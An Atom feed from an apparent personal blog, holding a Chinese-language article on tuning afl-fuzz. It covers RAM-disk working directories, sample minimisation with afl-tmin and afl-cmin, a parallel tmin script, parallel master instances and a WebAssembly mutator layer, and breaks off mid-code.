<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>dwfault</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://dwfault.github.io/"/>
  <updated>2019-12-20T04:13:28.929Z</updated>
  <id>https://dwfault.github.io/</id>
  
  <author>
    <name>dwfault</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>afl-fuzz暴力效率流实践</title>
    <link href="https://dwfault.github.io/2019/12/20/afl-fuzz%E6%9A%B4%E5%8A%9B%E6%95%88%E7%8E%87%E6%B5%81%E5%AE%9E%E8%B7%B5/"/>
    <id>https://dwfault.github.io/2019/12/20/afl-fuzz暴力效率流实践/</id>
    <published>2019-12-20T04:13:28.928Z</published>
    <updated>2019-12-20T04:13:28.929Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>关于afl-fuzz的原理和各种基本使用方法，已经有各位机智的网友写得比较完整了。本文的主要内容是，根据afl的一些特性，进行针对性的部署以提高fuzz的效率。虽然afl-fuzz是一个开箱即用的工具，但直接部署使用基本上是无法获得漏洞产出的。</p><h3 id="二、读写文件操作"><a href="#二、读写文件操作" class="headerlink" title="二、读写文件操作"></a>二、读写文件操作</h3><p>afl-fuzz在运行时的一个典型命令，形如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -m none -t 2000 -- ffmpeg -i @@</span><br></pre></td></tr></table></figure><p>给afl-fuzz指定参数时，@@在运行时实际被替换成out/.cur_input</p><p>也就是说每次执行的是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i out/.cur_input</span><br></pre></td></tr></table></figure><p>可以看到这个文件在out目录下被不停地写入、删除，才支撑了afl-fuzz不停的变异尝试。在CPU、内存、硬盘中，硬盘运行速度是最慢的，因此在大多数情况下硬盘的读写速度才是afl-fuzz运行的瓶颈。</p><p>为了加快速度，可以把afl-fuzz的工作目录、可执行文件，放入/dev/shm，使用Linux的共享内存运行。这样类似RamDisk的操作把硬盘读写操作变成了内存读写操作。在一般的情况下，fuzz速度可以有二倍的提升。</p><p>但这个解决方案有一点局限性：</p><ul><li>内存是易失性存储，如果运行fuzz的机器不幸重启，工作目录是无法保存的。这种情况下相当于之前跑的结果都丢失了。</li><li>在物理内存容量有限的时候，频繁的页面交换仍然会导致硬盘参与fuzz运行，拖慢运行速度。因此使用这种方案需要大内存支持。另外，在托管式fuzz平台上(例如ContinuesFuzzingPlatform)使用这种方案同样是不建议的。</li></ul><h3 id="三、图形化界面"><a href="#三、图形化界面" class="headerlink" title="三、图形化界面"></a>三、图形化界面</h3><p>关闭Linux的图形化操作界面虽然不能提升fuzz运行速度，但能够显著增强操作系统运行的稳定性(毕竟Linux的图形化界面)。</p><p><img src="afl-fuzz暴力效率流实践.assets/image-20181203105126500-3805486.png" alt="image-20181203105126500"></p><p>关闭图形化界面的方法，例如Ubuntu 14/16：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service lightdm stop</span><br></pre></td></tr></table></figure><p>在原始界面可以使用Control + Shift + F1、Control + Shift + F2、Control + Shift + F3等切换tty，获得不同的bash shell。在原始界面最多可以有6个tty供使用，因而在CPU数量足够的时候可以显式跑6个afl-fuzz的实例。</p><h3 id="四、确定性变异与文件大小"><a href="#四、确定性变异与文件大小" class="headerlink" title="四、确定性变异与文件大小"></a>四、确定性变异与文件大小</h3><p>afl-fuzz的变异策略包括确定性策略(deterministic)和随机性策略(random)，afl界面的左下角标明了不同策略下、不同阶段中的fuzz产出：</p><p><img src="afl-fuzz暴力效率流实践.assets/image112.png" alt="image.png"></p><p>随机性策略仅包括havoc和splice，而确定性策略包括：</p><ul><li>bit flips</li><li>byte flips</li><li>arithmetic</li><li>known ints</li><li>dictionary</li></ul><p>确定性策略的含义如下：对于一个文件，未来所有可能发生的变异都是已经确定了的，均为字长+步长的形式。例如flip是进行0、1的翻转操作，arithmetic是对字节进行数学运算操作，dictionary是对一些token字符串进行插入或覆盖操作。</p><p>既然是字长+步长的形式，文件的大小就极为重要。假如有一个1MB大小的样本文件，总共有1*10^6*8个bit，那么第一步bit flip 1/1，字长为1、步长为1，那么每次翻转一个bit，从前往后所有bit依次翻转，总共需要1*10^6*8次，即使目标程序每秒钟能够进行100次，仍然需要超过20个小时才能遍历完成这第一个文件的第一步变异，bitflip 2/1时则又需要10个小时…这样的fuzz相当于什么都没有fuzz，效率极低。这就是为什么afl的官方文档中要求每个文件最大不要超过10KB，而最好的情况下，样本文件大小应该小于1KB。样本文件大小非常非常重要，甚至可能是使用afl-fuzz不出结果的最重要原因之一。</p><p>另外，deterministic模式的变异在整个afl-fuzz的变异中占用了大多数的时间，而实践表明在无法找到更多样本的情况下，random策略可以更快地发现更多路径，并一定程度上弥补样本质量问题。</p><p>另外是右上角的cycles done表明了所有文件在deterministc策略下fuzz的完成数。由于deterministic策略下各文件的变异都是确定的，理论上不应该让cycles done这个值大于1。</p><h3 id="五、样本复杂度与tmin"><a href="#五、样本复杂度与tmin" class="headerlink" title="五、样本复杂度与tmin"></a>五、样本复杂度与tmin</h3><p>为了解决上述问题，同时保持样本的复杂度，afl-fuzz内置了一个叫做tmin的工具。使用afl-tmin的命令与afl-fuzz是相似的，但-i -o对应的参数是文件名，而不是文件夹名:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i 2 -o 2.min -- ~/parse</span><br><span class="line">afl-tmin 2.03b by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">[+] Read 80 bytes from <span class="string">'2'</span>.</span><br><span class="line">[*] Performing dry run (mem <span class="built_in">limit</span> = 50 MB, timeout = 1000 ms)...</span><br><span class="line">[+] Program terminates normally, minimizing <span class="keyword">in</span> instrumented mode.</span><br><span class="line">[*] Stage <span class="comment">#0: One-time block normalization...</span></span><br><span class="line">[+] Block normalization complete, 36 bytes replaced.</span><br><span class="line">[*] --- Pass <span class="comment">#1 ---</span></span><br><span class="line">[*] Stage <span class="comment">#1: Removing blocks of data...</span></span><br><span class="line">Block length = 8, remaining size = 80</span><br><span class="line">Block length = 4, remaining size = 80</span><br><span class="line">Block length = 2, remaining size = 76</span><br><span class="line">Block length = 1, remaining size = 76</span><br><span class="line">[+] Block removal complete, 6 bytes deleted.</span><br><span class="line">[*] Stage <span class="comment">#2: Minimizing symbols (22 code points)...</span></span><br><span class="line">[+] Symbol minimization finished, 17 symbols (21 bytes) replaced.</span><br><span class="line">[*] Stage <span class="comment">#3: Character minimization...</span></span><br><span class="line">[+] Character minimization <span class="keyword">done</span>, 2 bytes replaced.</span><br><span class="line">[*] --- Pass <span class="comment">#2 ---</span></span><br><span class="line">[*] Stage <span class="comment">#1: Removing blocks of data...</span></span><br><span class="line">Block length = 4, remaining size = 74</span><br><span class="line">Block length = 2, remaining size = 74</span><br><span class="line">Block length = 1, remaining size = 74</span><br><span class="line">[+] Block removal complete, 0 bytes deleted.</span><br><span class="line"></span><br><span class="line">File size reduced by : 7.50% (to 74 bytes)</span><br><span class="line">Characters simplified : 79.73%</span><br><span class="line">Number of execs <span class="keyword">done</span> : 221</span><br><span class="line">Fruitless execs : path=189 crash=0 hang=0</span><br><span class="line"></span><br><span class="line">[*] Writing output to <span class="string">'2.min'</span>...</span><br><span class="line">[+] We<span class="string">'re done here. Have a nice day!</span></span><br></pre></td></tr></table></figure><p>tmin的原理也是基于字长+步长的形式，逐字节删除，然后通过插装反馈得出样本改变是否导致了程序运行路径发生了变化。若没有发生变化，可以认为删去的字节是冗余的，因此可以用来对单个样本精简。</p><p>由于tmin基于字长+步长的形式，它消耗的时间也是很多很多的，所以需要写一个脚本进行批量化。也有并行化tmin的第三方工具ptmin，它将afl-tmin并行化到一定数量的进程中，并证明在精简样本过程中显著地提升了速度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cores=<span class="variable">$1</span></span><br><span class="line">inputdir=<span class="variable">$2</span></span><br><span class="line">outputdir=<span class="variable">$3</span></span><br><span class="line">pids=<span class="string">""</span></span><br><span class="line">total=`ls <span class="variable">$inputdir</span> | wc -l`</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> `seq 1 <span class="variable">$cores</span> <span class="variable">$total</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> `seq 0 $(expr <span class="variable">$cores</span> - 1)`</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    file=`ls -Sr <span class="variable">$inputdir</span> | sed $(expr <span class="variable">$i</span> + <span class="variable">$k</span>)<span class="string">"q;d"</span>`</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span></span><br><span class="line">    afl-tmin -i <span class="variable">$inputdir</span>/<span class="variable">$file</span> -o <span class="variable">$outputdir</span>/<span class="variable">$file</span> -- ~/parse &amp;</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">wait</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$ screen ~/afl-ptmin 8 ./queue_cmin/ ./queue/</span></span><br></pre></td></tr></table></figure><h3 id="六、样本多样性与cmin"><a href="#六、样本多样性与cmin" class="headerlink" title="六、样本多样性与cmin"></a>六、样本多样性与cmin</h3><p>为了增加覆盖率，样本需要有一定的多样性。人工增加样本多样性的方法中，最简单且明显的就是搜集下载样本，放进输入文件夹。这个过程是对样本进行丰富的过程，它非常重要，但这个过程也常常引入样本的冗余，降低fuzz的效率。为了解决这个问题，需要从大量的样本中筛掉无用的样本。</p><p>afl-cmin的命令与afl-fuzz、tmin也是相似的，但与tmin对比来看，tmin操作的是单个文件，输出单个文件；cmin操作的是文件集合，输出的也是文件集合。</p><p>曾经有过一些案例，辛苦找了200个文件、进行过tmin之后放入afl-fuzz的输入目录进行fuzz，对输入目录进行cmin后发现这些文件导致的程序执行路径是一样的。可以简单计算：如果不进行cmin，对这200个文件进行fuzz的结果相当于对1个文件进行fuzz200次，非常低效。</p><p>cmin也是成功使用afl-fuzz中必不可少的一步。</p><h3 id="七、路径队列"><a href="#七、路径队列" class="headerlink" title="七、路径队列"></a>七、路径队列</h3><p>在afl-fuzz的工作目录中有一个queue文件夹，这个文件夹内部的每个文件代表了afl-fuzz在模糊测试过程中获得的所有路径，每条路径不重复并且每条新路径都被修剪(trim)过。根据前两点针对样本复杂度和样本多样性的阐述，显然可以知道这些文件是用afl-fuzz运行时间换来的除crash之外的最重要产出。这些文件应该被收集起来，在fuzz同样的目标或者类似目标的时候可以并且应该被放入初始输入文件夹。</p><p>使用这样的方法，本质上是借助历史积累消除afl-fuzz中路径发现过程的不确定性，把握更多确定性的样本，从而提高覆盖率。</p><p>在smb://192.168.69.115/RESEARCH1-Internal中，我放入了很多fuzz过程中生成、收集的样本，数量超过20000，后续也会不断更新：</p><p> <img src="afl-fuzz暴力效率流实践.assets/image-20181203110739214-3806459.png" alt="image-20181203110739214"></p><h3 id="八、改造：并行模式"><a href="#八、改造：并行模式" class="headerlink" title="八、改造：并行模式"></a>八、改造：并行模式</h3><p>afl-fuzz的一个实例仅使用一个CPU。使用多个CPU的时候可以使用afl-fuzz的并行模式加快对样本的处理进度。但随着CPU数量线性增加，afl-fuzz的处理速度并不是线性增长的。</p><p>afl-fuzz内置的并行模式使用-M、-S来指定，主、从fuzzer使用简单的文件夹分离、读文件的方法来实现同步。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -m none -t 2000 -M master -- ffmpeg -i @@</span><br><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -m none -t 2000 -S slave1 -- ffmpeg -i @@</span><br><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -m none -t 2000 -S slave2 -- ffmpeg -i @@</span><br><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -m none -t 2000 -S slave3 -- ffmpeg -i @@</span><br></pre></td></tr></table></figure><p>afl-fuzz的代码中规定master fuzzer使用deterministic fuzz，只能有一个实例；slave  fuzzer使用random fuzz(dirty模式)，可以有多个实例。上述命令将会在out文件夹建立master、slave1、slave2、slave3三个文件夹，四个 fuzzer各使用一个CPU。在fuzz过程中，各 fuzzer在空闲时可以读取其他文件夹中的新文件，然后对自己的queue文件进行同步和更新。</p><p>个人认为这并不是一个很理想的解决方案，因为这样的条件下，运行前期master fuzzer的deterministic进程太慢，而slave随机产生新的样本后，master进程的deterministic变异进程总是来不及处理；而各slave进程重复概率大，需要的同步开销过大，导致afl-fuzz的处理速度并不是线性增长。</p><p>为了改善上述问题，afl官方文档提到代码实现了一种试验性功能的支持：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">there is anexperimental support <span class="keyword">for</span> parallelizing the deterministic checks. To leveragethat, you need to create -M instances like so:</span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterA:1/3 [...]</span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterB:2/3 [...]</span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterC:3/3 [...]</span><br><span class="line">...<span class="built_in">where</span> the first value after <span class="string">':'</span> is the sequential ID of a particular masterinstance (starting at 1), and the second value is the total number of fuzzers to distribute the deterministic fuzzing across. Note that <span class="keyword">if</span> you boot up fewer fuzzers than indicated by the second number passed to -M, you may end up with poor coverage.</span><br></pre></td></tr></table></figure><p>这种试验性功能的思想是把deterministic fuzz分为不同的进程来进行。但是从实际代码来看，afl并没有实现这一功能，而仅仅解析了master_id。这里非常容易误导用户。</p><p>借鉴这个思想可以简单地实现这个功能。代码diff可以参考gitlab/wangxin/afl-wasm-d4/。更改的代码位于fuzz_one()函数，伪代码形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (master_id == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//bitflip 1/1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(master_id == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">//bitflip 2/1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>通过master_id对deterministic的阶段进行划分，依据各阶段步长可以很容易计算出来划分依据。一个比较合理的划分可以让afl的进程分别执行以下过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//master1</span></span><br><span class="line">  bit flips:  x/x  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> byte flips:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">arithmatics:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> known ints:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> dictionary:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//master2</span></span><br><span class="line">  bit flips:  <span class="number">0</span>/<span class="number">0</span>  x/x  x/x</span><br><span class="line"> byte flips:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">arithmatics:  x/x  x/x  x/x</span><br><span class="line"> known ints:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> dictionary:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//master3</span></span><br><span class="line">  bit flips:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> byte flips:  x/x  x/x  x/x  </span><br><span class="line">arithmatics:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> known ints:  <span class="number">0</span>/<span class="number">0</span>  x/x  x/x  </span><br><span class="line"> dictionary:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//master4</span></span><br><span class="line">  bit flips:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> byte flips:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">arithmatics:  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> known ints:  x/x  <span class="number">0</span>/<span class="number">0</span>  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line"> dictionary:  x/x  x/x  x/x</span><br></pre></td></tr></table></figure><p>在这样的划分下，各master进程可以很快完成deterministic fuzz，配合少量的slave进程应该可以把fuzz效率在短时间内提升到较高。</p><p>另外，注意有一部分代码需要在if之外，所有的进程都需要处理这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (eff_cnt != EFF_ALEN(len) &amp;&amp;</span><br><span class="line">eff_cnt * <span class="number">100</span> / EFF_ALEN(len) &gt; EFF_MAX_PERC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(eff_map, <span class="number">1</span>, EFF_ALEN(len));</span><br><span class="line">blocks_eff_select += EFF_ALEN(len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">blocks_eff_select += eff_cnt;</span><br><span class="line">&#125;</span><br><span class="line">blocks_eff_total += EFF_ALEN(len);</span><br></pre></td></tr></table></figure><h3 id="九、改造：变异器加层"><a href="#九、改造：变异器加层" class="headerlink" title="九、改造：变异器加层"></a>九、改造：变异器加层</h3><p>对afl-fuzz的变异器加层是一种扩展方法，并不是用于提升afl-fuzz常规运行效率。</p><p>afl-fuzz适合基于字节粒度变异的fuzz，但并不是所有目标都可以直接进行字节粒度的fuzz。有些是因为文件解析部分的代码不能单独抽出来，有些是因为文件解析仅仅是逻辑的开始。那么为变异器加层就是在这方面扩展afl-fuzz的最简单方法。</p><p>一个示例的代码可以参考gitlab/wangxin/afl-wasm/，这是一个可以为WebAssembly的wasm文件变异加层的fuzzer。这个工具产生的样本如下所示，其中变异的部分是wasmCode中的字节码，而外围的JavaScript代码需要手动编写，而且要求外围代码应该尽量复杂。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> importObject = &#123;</span><br><span class="line">    env: &#123;</span><br><span class="line">        print_number: <span class="function"><span class="keyword">function</span> (<span class="params">number</span>) </span>&#123;</span><br><span class="line">            print(<span class="string">'[+] importObject callback.'</span>);</span><br><span class="line">            print(number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x60</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x0</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0xd</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x11</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0xb</span>]);</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////INIT</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line">    <span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, importObject);</span><br><span class="line">    print(<span class="string">'[+] wasmCode validate.'</span>);</span><br><span class="line">    print(WebAssembly.validate(wasmCode));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (e) &#123; print(e); &#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////EXPORTS</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wasmInstanceExported = wasmInstance.exports;</span><br><span class="line">    print(<span class="string">'[+] wasmInstanceExported.'</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> wasmInstanceExportedTable = wasmInstance.exports.table;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            print(wasmInstanceExportedTable.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123; print(e); &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        print(wasmInstanceExported.main(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123; print(e); &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> wasmInstanceExported) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                print(<span class="built_in">eval</span>(<span class="string">'wasmInstanceExported.'</span> + i + <span class="string">';'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (e) &#123; print(e); &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>为了实现这一加层，需要修改的地方是afl-fuzz.c的write_to_testcase()函数，大意是把变异的字节序列封装成字符串，并加上前后缀字符串写入文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write_to_testcase</span><span class="params">(<span class="keyword">void</span>* mem, u32 len)</span> </span>&#123;</span><br><span class="line">  s32 fd = out_fd;</span><br><span class="line">  <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">    unlink(out_file); <span class="comment">/* Ignore errors. */</span></span><br><span class="line">    fd = open(out_file, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">"Unable to create '%s'"</span>, out_file);</span><br><span class="line">  &#125; <span class="keyword">else</span> lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">char</span> formatS[<span class="number">13</span>] = <span class="string">"'0x%02hhx', "</span>;</span><br><span class="line">  <span class="keyword">char</span> formatBuffer[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  u32 